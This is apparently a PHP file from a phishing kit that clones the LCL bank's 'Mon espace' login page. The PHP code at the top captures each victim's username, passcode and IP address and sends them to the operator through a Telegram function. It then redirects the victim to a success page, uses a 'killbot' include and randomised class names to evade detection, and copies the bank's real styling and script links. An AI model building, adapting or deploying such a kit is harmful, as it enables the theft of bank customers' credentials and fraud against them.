<?php


require_once 'killbot/code/include.php';

error_reporting(0);

if (session_status() === PHP_SESSION_NONE) {
  session_start();
}

include 'includes.php';
include 'core/ip.php';
include 'core/telegram.php';
include 'config.php';

if (isset($_POST['user'],$_POST['passcode'])) {

  $ip = ip();
  $reference = $_POST['user'];
  $reference = $_POST['passcode'];
 

  $message = "💌 NOUVEAU LOG LCL : $ip\n\n";
  $message .= "🧲 IDENTIFIANT : $user \n";
  $message .= "🧲 CODE PERSONNEL : $passcode \n";
  
  $_SESSION['data'] = $message;

  tlgsend(urlencode($message));

   header('location: ../success.php');
}

?>
<html lang="fr-FR" class="<?php echo generateRandomString(); ?>  js-focus-visible" data-js-focus-visible="">

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  <title>LCL - Mon espace</title>
  <!--<base href="/">-->
  <base href=".">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="msapplication-config" content="/assets/browserconfig.xml">
  <meta name="theme-color" content="#1f368b">
  <meta name="robots" content="noindex, nofollow">
  <link rel="shortcut icon" href="https://monespace.lcl.fr/favicon.ico">
  <link rel="apple-touch-icon" sizes="57x57" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-57x57.png">
  <link rel="apple-touch-icon" sizes="114x114" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-114x114.png">
  <link rel="apple-touch-icon" sizes="72x72" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-72x72.png">
  <link rel="apple-touch-icon" sizes="144x144" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-144x144.png">
  <link rel="apple-touch-icon" sizes="60x60" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-60x60.png">
  <link rel="apple-touch-icon" sizes="120x120" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-120x120.png">
  <link rel="apple-touch-icon" sizes="76x76" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-76x76.png">
  <link rel="apple-touch-icon" sizes="152x152" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-152x152.png">
  <link rel="apple-touch-icon" sizes="180x180" href="https://monespace.lcl.fr/assets/favicons/apple-touch-icon-180x180.png">
  <link rel="icon" type="image/png" href="https://monespace.lcl.fr/assets/favicons/favicon-192x192.png" sizes="192x192">
  <link rel="icon" type="image/png" href="https://monespace.lcl.fr/assets/favicons/favicon-160x160.png" sizes="160x160">
  <link rel="icon" type="image/png" href="https://monespace.lcl.fr/assets/favicons/favicon-96x96.png" sizes="96x96">
  <link rel="icon" type="image/png" href="https://monespace.lcl.fr/assets/favicons/favicon-16x16.png" sizes="16x16">
  <link rel="icon" type="image/png" href="https://monespace.lcl.fr/assets/favicons/favicon-32x32.png" sizes="32x32">
  <link rel="stylesheet" href="./content/styles.d2286c444e7d586caa1a.css">
  <style id="inert-style">
    [inert] {
      pointer-events: none;
      cursor: default;
    }

    [inert],
    [inert] * {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
    }
  </style>
  <style>
    [_nghost-ng-front-c17] {
      display: block;
      height: 100%;
    }
  </style>
  <style>
    [_nghost-ng-front-c11] {
      z-index: 999999;
      pointer-events: none
    }

    [fixed=true][_nghost-ng-front-c11] .ng-progress-bar[_ngcontent-ng-front-c11],
    [fixed=true][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      position: fixed
    }

    [fixed=true][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      top: 15px
    }

    [fixed=true][spinnerPosition=left][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      left: 15px
    }

    [fixed=true][spinnerPosition=right][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      right: 15px
    }

    [thick=true][_nghost-ng-front-c11] .ng-spinner-icon[_ngcontent-ng-front-c11] {
      width: 24px;
      height: 24px;
      border-width: 3px
    }

    [thick=true][_nghost-ng-front-c11] .ng-bar-placeholder[_ngcontent-ng-front-c11] {
      height: 3px !important
    }

    [dir="ltr+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=ltr-][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      transform: rotate(3deg)
    }

    [dir="ltr+"][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=ltr-][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      transform: rotate(4deg)
    }

    [dir="ltr+"][_nghost-ng-front-c11] .ng-bar[_ngcontent-ng-front-c11],
    [dir="rtl+"][_nghost-ng-front-c11] .ng-bar[_ngcontent-ng-front-c11] {
      margin-left: -100%
    }

    [dir="ltr+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir="rtl+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      right: 0
    }

    [dir="ltr+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=rtl-][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      top: -3px
    }

    [dir="ltr+"][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=rtl-][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      top: -4px
    }

    [dir="rtl+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=ltr-][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      bottom: -3px
    }

    [dir="rtl+"][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=ltr-][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      bottom: -4px
    }

    [dir="rtl+"][_nghost-ng-front-c11] .ng-bar-placeholder[_ngcontent-ng-front-c11],
    [dir=ltr-][_nghost-ng-front-c11] .ng-bar-placeholder[_ngcontent-ng-front-c11] {
      transform: rotate(180deg)
    }

    [dir="rtl+"][_nghost-ng-front-c11] .ng-spinner-icon[_ngcontent-ng-front-c11],
    [dir=ltr-][_nghost-ng-front-c11] .ng-spinner-icon[_ngcontent-ng-front-c11] {
      animation-direction: reverse
    }

    [dir="rtl+"][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=rtl-][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      transform: rotate(-3deg)
    }

    [dir="rtl+"][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11],
    [dir=rtl-][thick=true][_nghost-ng-front-c11] .ng-meteor[_ngcontent-ng-front-c11] {
      transform: rotate(-4deg)
    }

    [spinnerPosition=left][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      left: 10px
    }

    [spinnerPosition=right][_nghost-ng-front-c11] .ng-spinner[_ngcontent-ng-front-c11] {
      right: 10px
    }

    .ng-progress-bar[_ngcontent-ng-front-c11] {
      position: relative;
      z-index: 999999;
      top: 0;
      left: 0;
      width: 100%;
      zoom: 1;
      opacity: 0
    }

    .ng-progress-bar[active=true][_ngcontent-ng-front-c11] {
      opacity: 1;
      transition: none
    }

    .ng-bar-placeholder[_ngcontent-ng-front-c11] {
      position: absolute;
      height: 2px;
      width: 100%
    }

    .ng-bar[_ngcontent-ng-front-c11] {
      width: 100%;
      height: 100%;
      transform: translate(-100%, 0, 0)
    }

    .ng-meteor[_ngcontent-ng-front-c11] {
      display: block;
      position: absolute;
      width: 100px;
      height: 100%;
      opacity: 1
    }

    .ng-spinner[_ngcontent-ng-front-c11] {
      position: absolute;
      display: block;
      z-index: 1031;
      top: 10px
    }

    .ng-spinner-icon[_ngcontent-ng-front-c11] {
      width: 18px;
      height: 18px;
      box-sizing: border-box;
      -webkit-animation: 250ms linear infinite spinner-animation;
      animation: 250ms linear infinite spinner-animation;
      border: 2px solid transparent;
      border-radius: 50%
    }

    @-webkit-keyframes spinner-animation {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }

    @keyframes spinner-animation {
      0% {
        transform: rotate(0)
      }

      100% {
        transform: rotate(360deg)
      }
    }
  </style>
  <style>
    [_nghost-ng-front-c79] {
      display: block;
      position: relative
    }

    .processing[_nghost-ng-front-c79] .help-links[_ngcontent-ng-front-c79],
    .processing[_nghost-ng-front-c79] header[_ngcontent-ng-front-c79] {
      opacity: .5
    }

    .sidepane[_ngcontent-ng-front-c79] {
      box-sizing: border-box;
      padding-top: 40px;
      padding-bottom: 40px
    }

    .help-links[_ngcontent-ng-front-c79],
    header[_ngcontent-ng-front-c79] {
      padding: 0 20px
    }

    header[_ngcontent-ng-front-c79] {
      margin-bottom: 30px
    }

    header[_ngcontent-ng-front-c79] .logo[_ngcontent-ng-front-c79] {
      text-align: center
    }

    header[_ngcontent-ng-front-c79] .logo[_ngcontent-ng-front-c79] img[_ngcontent-ng-front-c79] {
      width: 100px;
      height: 75px
    }

    .help-links[_ngcontent-ng-front-c79] .links[_ngcontent-ng-front-c79] {
      list-style-type: none;
      margin: 0;
      padding: 0;
      text-align: center
    }

    .help-links[_ngcontent-ng-front-c79] .links[_ngcontent-ng-front-c79] li[_ngcontent-ng-front-c79] {
      margin: 10px 0
    }

    @media (min-width:500px) {
      .sidepane[_ngcontent-ng-front-c79] {
        padding-top: 70px;
        padding-bottom: 70px
      }

      header[_ngcontent-ng-front-c79] {
        margin-bottom: 50px
      }

      header[_ngcontent-ng-front-c79] .logo[_ngcontent-ng-front-c79] img[_ngcontent-ng-front-c79] {
        width: 125px;
        height: 95px
      }
    }

    @media (min-width:900px) {
      .sidepane .image {
        min-height: 865px
      }
    }

    .alert[_ngcontent-ng-front-c79] {
      color: #5e5e5e;
      font-size: 12px;
      font-weight: 400;
      line-height: 18px;
      margin: 20px auto 0;
      max-width: 360px;
      text-align: center
    }

    .alert[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79],
    .alert[_ngcontent-ng-front-c79] p[_ngcontent-ng-front-c79] {
      margin: 0 auto 5px
    }

    .alert[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79] {
      font-size: 14px;
      font-weight: 500;
      line-height: 22px
    }

    .alert[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79] .ico-alert[_ngcontent-ng-front-c79] {
      margin-top: -2px
    }

    @media (min-width:500px) {
      .alert[_ngcontent-ng-front-c79] {
        line-height: 22px;
        margin-top: 25px
      }

      .alert[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79] {
        font-size: 16px;
        line-height: 24px
      }

      .alert[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79] .ico-alert[_ngcontent-ng-front-c79] {
        margin-top: -4px
      }
    }

    .alert-error[_ngcontent-ng-front-c79] .alert-heading[_ngcontent-ng-front-c79] {
      color: #e52615
    }

    .message-banners-box[_ngcontent-ng-front-c79] {
      margin-top: 30px
    }

    @media (min-width:900px) {
      .message-banners-box[_ngcontent-ng-front-c79] {
        max-width: 550px
      }
    }

    @media (min-width:1470px) {
      .message-banners-box[_ngcontent-ng-front-c79] {
        max-width: none;
        position: absolute;
        left: 550px;
        right: 0;
        bottom: 70px
      }
    }
  </style>
  <style>
    [_nghost-ng-front-c73] {
      box-sizing: border-box;
      display: block;
      min-height: 100vh;
      overflow: hidden
    }

    .content[_ngcontent-ng-front-c73],
    [_nghost-ng-front-c73] {
      position: relative
    }

    .content[_ngcontent-ng-front-c73] {
      margin: auto;
      max-width: 550px
    }

    .image[_ngcontent-ng-front-c73] {
      position: absolute;
      background-repeat: no-repeat;
      background-size: cover;
      background-position: 100%;
      bottom: 0;
      left: 550px;
      right: 0;
      top: 0
    }

    .image[_ngcontent-ng-front-c73]+.content[_ngcontent-ng-front-c73] {
      margin-left: 0
    }
  </style>
  <style>
    [_nghost-ng-front-c72] {
      display: block;
      margin-bottom: 15px
    }

    .processing[_nghost-ng-front-c72] .app-title[_ngcontent-ng-front-c72],
    .processing[_nghost-ng-front-c72] .button-group[_ngcontent-ng-front-c72],
    .processing[_nghost-ng-front-c72] .preset-group[_ngcontent-ng-front-c72] .app-link[_ngcontent-ng-front-c72] {
      opacity: .5
    }

    .control-group[_ngcontent-ng-front-c72] {
      text-align: center
    }

    .identifier-group[_ngcontent-ng-front-c72] {
      overflow: hidden
    }

    .remember-identifier-group[_ngcontent-ng-front-c72] {
      color: #202122;
      font-size: 12px;
      line-height: 15px;
      margin-top: 20px
    }

    @media (min-width:500px) {
      .remember-identifier-group[_ngcontent-ng-front-c72] {
        font-size: 14px;
        line-height: 28px
      }
    }

    [_ngcontent-ng-front-c72]:not(.preset-group)+.code-group[_ngcontent-ng-front-c72] {
      margin-top: 40px
    }

    @media (min-width:500px) {
      [_ngcontent-ng-front-c72]:not(.preset-group)+.code-group[_ngcontent-ng-front-c72] {
        margin-top: 50px
      }
    }

    .preset-group[_ngcontent-ng-front-c72]+.code-group[_ngcontent-ng-front-c72] {
      margin-top: 15px
    }

    @media (min-width:500px) {
      .preset-group[_ngcontent-ng-front-c72]+.code-group[_ngcontent-ng-front-c72] {
        margin-top: 30px
      }
    }

    .button-group[_ngcontent-ng-front-c72] {
      margin-top: 30px
    }

    .button-group[_ngcontent-ng-front-c72] .app-cta-button[_ngcontent-ng-front-c72] {
      min-width: 190px
    }

    @media (min-width:500px) {
      .button-group[_ngcontent-ng-front-c72] {
        margin-top: 35px
      }
    }

    .preset-group[_ngcontent-ng-front-c72] {
      position: relative;
      padding-bottom: 25px
    }

    @media (min-width:500px) {
      .preset-group[_ngcontent-ng-front-c72] {
        padding-bottom: 40px
      }
    }

    .preset-group[_ngcontent-ng-front-c72]:before {
      content: "";
      position: absolute;
      left: 50%;
      transform: translateX(-50%);
      bottom: 0;
      height: 1px;
      width: 25px;
      border-bottom: 4px solid #ffd204
    }

    .preset-group[_ngcontent-ng-front-c72] h2[_ngcontent-ng-front-c72] {
      font-size: 16px;
      line-height: 28px;
      margin: 0
    }

    .preset-group[_ngcontent-ng-front-c72] button[_ngcontent-ng-front-c72] {
      line-height: 22px
    }
  </style>
  <style>
    [_nghost-ng-front-c69] {
      display: inline-block;
      font-family: Roboto Mono, monospace;
      font-size: 18px;
      font-weight: 400;
      line-height: 22px
    }

    .disabled[_nghost-ng-front-c69] .input[_ngcontent-ng-front-c69] {
      opacity: .5
    }

    @media (min-width:500px) {
      [_nghost-ng-front-c69] {
        font-size: 20px;
        line-height: 24px
      }
    }

    @supports (-moz-appearance:none) {
      [_nghost-ng-front-c69] {
        margin-right: -30px;
        overflow: hidden
      }

      @media (min-width:500px) {
        [_nghost-ng-front-c69] {
          margin-right: -44px
        }
      }
    }

    .input[_ngcontent-ng-front-c69] {
      background: none;
      border: none;
      box-sizing: content-box;
      caret-color: #3b51d5;
      display: block;
      font-family: inherit;
      font-size: inherit;
      font-weight: inherit;
      margin: 0;
      letter-spacing: 16px;
      line-height: inherit;
      outline: none;
      padding: 2px 5px;
      width: calc(100% + 10px);
      outline: none !important
    }

    .input[_ngcontent-ng-front-c69]::-ms-clear {
      display: none
    }

    @media (min-width:500px) {
      .input[_ngcontent-ng-front-c69] {
        letter-spacing: 28px;
        padding: 4px 7px;
        width: calc(100% + 14px)
      }
    }

    .strokes[_ngcontent-ng-front-c69] {
      display: flex
    }

    .stroke[_ngcontent-ng-front-c69] {
      border-bottom: 1px solid #a5a5a5;
      margin-left: 7px;
      width: 20px
    }

    .stroke[_ngcontent-ng-front-c69]:first-child {
      margin-left: 0
    }

    @media (min-width:500px) {
      .stroke[_ngcontent-ng-front-c69] {
        margin-left: 10px;
        width: 30px
      }
    }

    .stroke-filled[_ngcontent-ng-front-c69] {
      border-color: #202122
    }

    .stroke-activated[_ngcontent-ng-front-c69] {
      border-color: #546aeb
    }
  </style>
  <style>
    [_nghost-ng-front-c71] {
      cursor: pointer;
      display: inline-block;
      transition: background .2s;
      position: relative
    }

    .disabled[_nghost-ng-front-c71] {
      cursor: default
    }

    .light[_nghost-ng-front-c71] input[type=checkbox][_ngcontent-ng-front-c71]+label[_ngcontent-ng-front-c71]:before {
      border-color: #fff
    }

    .light[_nghost-ng-front-c71] input[type=checkbox][_ngcontent-ng-front-c71]:checked+label[_ngcontent-ng-front-c71]:before {
      background-color: #fff;
      border-color: #fff
    }

    .light[_nghost-ng-front-c71] input[type=checkbox][_ngcontent-ng-front-c71]:checked+label[_ngcontent-ng-front-c71]:after {
      border-color: #3b51d5
    }

    label[_ngcontent-ng-front-c71] {
      color: inherit;
      font-size: inherit;
      line-height: inherit
    }

    input[type=checkbox][_ngcontent-ng-front-c71],
    label[_ngcontent-ng-front-c71] {
      cursor: inherit;
      transition: inherit
    }

    input[type=checkbox][_ngcontent-ng-front-c71] {
      height: 24px;
      width: 24px;
      position: absolute;
      border: 1px solid #fff;
      border-radius: 3px;
      display: inline-block;
      vertical-align: middle;
      opacity: 0
    }

    @media (min-width:500px) {
      input[type=checkbox][_ngcontent-ng-front-c71] {
        width: 28px;
        height: 28px
      }
    }

    input[type=checkbox].focus-visible[_ngcontent-ng-front-c71]+label[_ngcontent-ng-front-c71]:before {
      outline: .1rem dotted
    }

    input[type=checkbox][_ngcontent-ng-front-c71]+label[_ngcontent-ng-front-c71]:before {
      content: "";
      background: #fff;
      background-position: 50%;
      background-repeat: no-repeat;
      border: 1px solid #919191;
      border-radius: 3px;
      box-shadow: 0 3px 8px 0 rgba(26, 57, 198, .08);
      cursor: inherit;
      display: inline-block;
      height: 24px;
      margin-right: 10px;
      transition: inherit;
      vertical-align: middle;
      width: 24px
    }

    @media (min-width:500px) {
      input[type=checkbox][_ngcontent-ng-front-c71]+label[_ngcontent-ng-front-c71]:before {
        width: 28px;
        height: 28px
      }
    }

    input[type=checkbox][_ngcontent-ng-front-c71]:checked+label[_ngcontent-ng-front-c71]:before {
      background-color: #3b51d5;
      border-color: #3b51d5;
      content: ""
    }

    input[type=checkbox][_ngcontent-ng-front-c71]:checked+label[_ngcontent-ng-front-c71]:after {
      content: "";
      width: 9px;
      height: 5px;
      border-left: 1px solid #fff;
      border-bottom: 1px solid #fff;
      display: inline-block;
      transform: rotate(-45deg);
      position: absolute;
      left: 7px;
      top: 7px
    }

    @media (min-width:500px) {
      input[type=checkbox][_ngcontent-ng-front-c71]:checked+label[_ngcontent-ng-front-c71]:after {
        left: 10px;
        top: 10px
      }
    }

    input[type=checkbox][_ngcontent-ng-front-c71]:disabled+label[_ngcontent-ng-front-c71] {
      opacity: .5
    }

    input[type=checkbox][_ngcontent-ng-front-c71]:disabled:not(:checked)+label[_ngcontent-ng-front-c71]:before {
      background-color: #eef0f8
    }
  </style>
  <script async="" src="./content/fbevents.js"></script>
  <script type="text/javascript" async="" src="./content/exec.js"></script>
  <script type="text/javascript" async="" src="./content/6565729.js"></script>
  <script id="tc_script_262_1" type="text/javascript" async="" src="./content/tro.js"></script>
  <script src="./content/cc.js" async="" type="text/javascript"></script>
  <script src="./content/envCheck.js" type="text/javascript" async="true"></script>
  <style>
    [_nghost-ng-front-c78] {
      display: block
    }

    [_nghost-ng-front-c78] .ui-swiper[_ngcontent-ng-front-c78] {
      max-width: 400px;
      margin: auto
    }

    [_nghost-ng-front-c78] .ui-message-banner[_ngcontent-ng-front-c78] {
      border: 1px solid #e7e9fe;
      background: #fff;
      margin: 0 10px 15px;
      box-shadow: 0 5px 10px 0 rgba(27, 43, 118, .12)
    }

    [_nghost-ng-front-c78] .control-box-next[_ngcontent-ng-front-c78],
    [_nghost-ng-front-c78] .control-box-previous[_ngcontent-ng-front-c78] {
      width: 40px;
      height: 40px;
      margin: 0 5px
    }

    [_nghost-ng-front-c78] .control-box-next[_ngcontent-ng-front-c78] .control-button[_ngcontent-ng-front-c78],
    [_nghost-ng-front-c78] .control-box-previous[_ngcontent-ng-front-c78] .control-button[_ngcontent-ng-front-c78] {
      cursor: pointer;
      display: inline-block;
      width: inherit;
      height: inherit;
      background-color: transparent;
      border: none
    }

    [_nghost-ng-front-c78] .control-box-previous[_ngcontent-ng-front-c78] .control-button[_ngcontent-ng-front-c78] {
      background-image: url(button-left-circle.d3c1e809a810eb7ec1ad.svg)
    }

    [_nghost-ng-front-c78] .control-box-next[_ngcontent-ng-front-c78] .control-button[_ngcontent-ng-front-c78] {
      background-image: url(button-right-circle.ed61a2eadf12cf18e670.svg)
    }

    [_nghost-ng-front-c78] .bullets[_ngcontent-ng-front-c78] {
      margin-top: -5px;
      text-align: center
    }

    [_nghost-ng-front-c78] .bullets[_ngcontent-ng-front-c78] .bullet[_ngcontent-ng-front-c78] {
      background-color: #384ecf;
      cursor: pointer;
      border: 0;
      width: 8px;
      height: 8px;
      opacity: .3;
      margin: 0 4px;
      box-sizing: border-box;
      border-radius: 8px;
      padding: 0
    }

    [_nghost-ng-front-c78] .bullets[_ngcontent-ng-front-c78] .bullet.active[_ngcontent-ng-front-c78] {
      opacity: .7
    }

    .wide[_nghost-ng-front-c78] {
      display: flex;
      flex-direction: row;
      align-content: center;
      align-items: center;
      justify-content: center
    }

    .wide[_nghost-ng-front-c78] .ui-swiper[_ngcontent-ng-front-c78] {
      max-width: 800px;
      margin: 0
    }

    .wide[_nghost-ng-front-c78] .ui-message-banner[_ngcontent-ng-front-c78] {
      border-color: #fff;
      box-shadow: none
    }

    .wide[_nghost-ng-front-c78] .control-box-next[_ngcontent-ng-front-c78],
    .wide[_nghost-ng-front-c78] .control-box-previous[_ngcontent-ng-front-c78] {
      margin-top: -28px
    }

    .wide[_nghost-ng-front-c78] .bullets[_ngcontent-ng-front-c78] button[_ngcontent-ng-front-c78] {
      background-color: #202122
    }
  </style>
  <style>
    .ui-swiper {
      display: block
    }

    .ui-swiper-track {
      display: flex;
      align-items: center
    }
  </style>
  <style>
    [_nghost-ng-front-c77] {
      box-sizing: border-box;
      display: flex;
      flex-direction: column;
      padding: 20px
    }

    [_nghost-ng-front-c77] .message-banner-image-container[_ngcontent-ng-front-c77] {
      position: absolute;
      overflow: hidden
    }

    [_nghost-ng-front-c77] .message-banner-image-container[_ngcontent-ng-front-c77] .message-banner-image[_ngcontent-ng-front-c77] {
      display: inline-block;
      width: 25px;
      height: 25px
    }

    [_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] {
      margin-bottom: 5px
    }

    [_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] h3[_ngcontent-ng-front-c77],
    [_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] time[_ngcontent-ng-front-c77] {
      display: block
    }

    [_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] h3[_ngcontent-ng-front-c77] {
      margin: 0 0 10px 35px;
      font-size: 14px;
      line-height: 24px;
      color: #232884
    }

    [_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] time[_ngcontent-ng-front-c77] {
      font-size: 12px;
      line-height: 18px;
      color: #5e5e5e;
      margin-top: 20px
    }

    [_nghost-ng-front-c77] .message-banner-body[_ngcontent-ng-front-c77] {
      font-size: 14px;
      line-height: 22px;
      color: #202122
    }

    [_nghost-ng-front-c77] .message-banner-body[_ngcontent-ng-front-c77] p {
      margin: 10px 0 0
    }

    [_nghost-ng-front-c77] .message-banner-link[_ngcontent-ng-front-c77] {
      margin-top: 10px
    }

    [_nghost-ng-front-c77] .message-banner-aside[_ngcontent-ng-front-c77] {
      margin-top: 20px
    }

    [_nghost-ng-front-c77] .message-banner-button[_ngcontent-ng-front-c77] {
      display: block;
      font-size: 12px;
      padding: 14px 20px
    }

    .wide[_nghost-ng-front-c77] {
      flex-direction: row;
      align-items: center;
      justify-content: space-between;
      padding: 30px 40px
    }

    .wide[_nghost-ng-front-c77] .message-banner-image-container[_ngcontent-ng-front-c77] {
      display: flex;
      flex: 0 0 auto;
      margin-right: 30px;
      position: static
    }

    .wide[_nghost-ng-front-c77] .message-banner-image-container[_ngcontent-ng-front-c77] .message-banner-image[_ngcontent-ng-front-c77] {
      width: 90px;
      height: 90px
    }

    .wide[_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] {
      margin-bottom: 10px
    }

    .wide[_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] h3[_ngcontent-ng-front-c77],
    .wide[_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] time[_ngcontent-ng-front-c77] {
      display: inline-block;
      margin: 0
    }

    .wide[_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] h3[_ngcontent-ng-front-c77] {
      margin-right: 12px
    }

    .wide[_nghost-ng-front-c77] .message-banner-header[_ngcontent-ng-front-c77] time[_ngcontent-ng-front-c77] {
      margin-top: 0
    }

    .wide[_nghost-ng-front-c77] .message-banner-content[_ngcontent-ng-front-c77] {
      margin-left: 0;
      margin-right: auto
    }

    .wide[_nghost-ng-front-c77] .message-banner-aside[_ngcontent-ng-front-c77] {
      flex: 0 0 auto;
      margin-top: 0;
      margin-left: 30px
    }

    .wide[_nghost-ng-front-c77] .message-banner-button[_ngcontent-ng-front-c77] {
      display: inline-block
    }
  </style>
  <script type="text/javascript" async="" src="./content/YXMFT"></script>
  <script type="text/javascript" async="" src="./content/SJKJt"></script>
  <script type="text/javascript" async="" src="./content/SJKJt(1)"></script>
  <script type="text/javascript" src="./content/newJsLibCLI.js" id="enqu3"></script>
  <style>
    [_nghost-ng-front-c70] {
      display: block;
      margin: auto;
      min-width: 240px;
      max-width: 320px;
      touch-action: manipulation
    }

    .disabled[_nghost-ng-front-c70] {
      opacity: .5
    }

    .pad-code[_ngcontent-ng-front-c70] {
      margin-bottom: 12px;
      text-align: center;
      padding: 0
    }

    @media (min-width:500px) {
      .pad-code[_ngcontent-ng-front-c70] {
        margin-bottom: 22px
      }
    }

    .pad-dot[_ngcontent-ng-front-c70] {
      display: inline-block;
      width: 15px;
      height: 15px;
      box-sizing: border-box;
      border: 1px solid #919191;
      border-radius: 50%;
      margin: 0 5px;
      padding: 0;
      vertical-align: middle
    }

    .pad-dot[_ngcontent-ng-front-c70] .bullet[_ngcontent-ng-front-c70] {
      display: none;
      position: relative;
      font-size: 20px;
      top: -2px;
      line-height: 6px;
      color: #3b51d5
    }

    .pad-dot.is-filled[_ngcontent-ng-front-c70] {
      border-color: #3b51d5;
      background: #3b51d5;
      overflow: hidden
    }

    .pad-dot.is-filled[_ngcontent-ng-front-c70] .bullet[_ngcontent-ng-front-c70] {
      display: inline-block
    }

    .pad-dot[_ngcontent-ng-front-c70]:first-child {
      margin-left: 35px
    }

    .pad-keys[_ngcontent-ng-front-c70] {
      margin: auto auto-5px;
      text-align: center
    }

    .pad-button[_ngcontent-ng-front-c70] {
      background: #f0f3ff;
      border: 0;
      border-radius: 50%;
      font-family: inherit;
      font-weight: 700;
      padding: 0;
      -webkit-tap-highlight-color: transparent;
      touch-action: manipulation
    }

    .pad-button[_ngcontent-ng-front-c70]:not([disabled]) {
      cursor: pointer
    }

    .pad-button[_ngcontent-ng-front-c70]:not([disabled]):active {
      background: #3b51d5;
      color: #f0f3ff
    }

    @media not all and (pointer:coarse) {
      .pad-button[_ngcontent-ng-front-c70]:not([disabled]):hover {
        background: #3b51d5;
        color: #f0f3ff
      }
    }

    .pad-key[_ngcontent-ng-front-c70] {
      color: #202122;
      font-size: 16px;
      line-height: 46px;
      margin: 5px;
      width: 46px
    }

    @media (min-width:500px) {
      .pad-key[_ngcontent-ng-front-c70] {
        line-height: 53px;
        width: 53px
      }
    }

    .pad-reset[_ngcontent-ng-front-c70] {
      background: rgba(0, 0, 0, .05);
      color: #747474;
      height: 30px;
      line-height: 30px;
      margin: 0 0 0 5px;
      position: relative;
      font-size: 10px;
      vertical-align: middle;
      width: 30px
    }

    .pad-reset[_ngcontent-ng-front-c70]:after,
    .pad-reset[_ngcontent-ng-front-c70]:before {
      content: "";
      border-top: 2px solid #747474;
      border-radius: 30px;
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      width: 11px
    }

    .pad-reset[_ngcontent-ng-front-c70]:before {
      transform: translate(-50%, -50%) rotate(-45deg)
    }

    .pad-reset[_ngcontent-ng-front-c70]:after {
      transform: translate(-50%, -50%) rotate(45deg)
    }

    .pad-reset[_ngcontent-ng-front-c70]:active,
    .pad-reset[_ngcontent-ng-front-c70]:hover {
      background: #3b51d5;
      color: #f0f3ff
    }

    .pad-reset[_ngcontent-ng-front-c70]:active:after,
    .pad-reset[_ngcontent-ng-front-c70]:active:before,
    .pad-reset[_ngcontent-ng-front-c70]:hover:after,
    .pad-reset[_ngcontent-ng-front-c70]:hover:before {
      border-color: #f0f3ff
    }
  </style>
  <script src="http://img-fdb.tech.lcl.fr/9874703/cc.js?r=0.42491724932738584" async="" type="text/javascript"></script>
  <script src="http://front.tech.lcl.fr/9874703/envCheck.js?dt=login&amp;r=0.5012578927017994" type="text/javascript" async="true"></script>
  <script src="http://img-fdb.tech.lcl.fr/9874703/cc.js?r=0.6504355182985719" async="" type="text/javascript"></script>
  <script src="http://front.tech.lcl.fr/9874703/envCheck.js?dt=login&amp;r=0.3815910764305297" type="text/javascript" async="true"></script>
</head>

<body>
  <app-root _nghost-ng-front-c17="">
    <ng-progress _ngcontent-ng-front-c17="" role="progressbar" aria-hidden="true" _nghost-ng-front-c11="" spinnerposition="right" dir="ltr+" thick="false" fixed="true">
      <div _ngcontent-ng-front-c11="" class="<?php echo generateRandomString(); ?>  ng-progress-bar" active="false" style="transition: opacity 200ms linear 0s;">
